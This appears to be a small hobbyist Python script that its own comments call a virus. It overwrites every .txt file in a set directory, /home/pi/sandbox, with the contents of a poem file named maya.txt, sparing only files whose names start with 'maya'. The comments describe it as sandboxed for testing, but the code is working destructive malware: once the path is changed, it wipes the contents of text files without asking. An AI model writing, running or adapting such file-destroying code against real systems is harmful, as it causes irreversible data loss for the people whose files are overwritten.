#!/usr/bin/env python3
import glob, os, re
mayatext = open('maya.txt', 'r')
path = "/home/pi/sandbox" #for testing purposes the virus is sandboxed to a specific directory so it can only affect files in the specifc folder
os.chdir(path)
maya = mayatext.read()

for files in glob.glob('*.txt'): #iterates through files in current directory with .txt extension
    if re.match('maya.*\.txt', files): #if the files is the poem text file it skips over it and doesnt overwrite it
        continue
    else:
        with open(files, 'w') as f: #writes over the iterated file with mayatext
            f.write(maya)

mayatext.close()











    
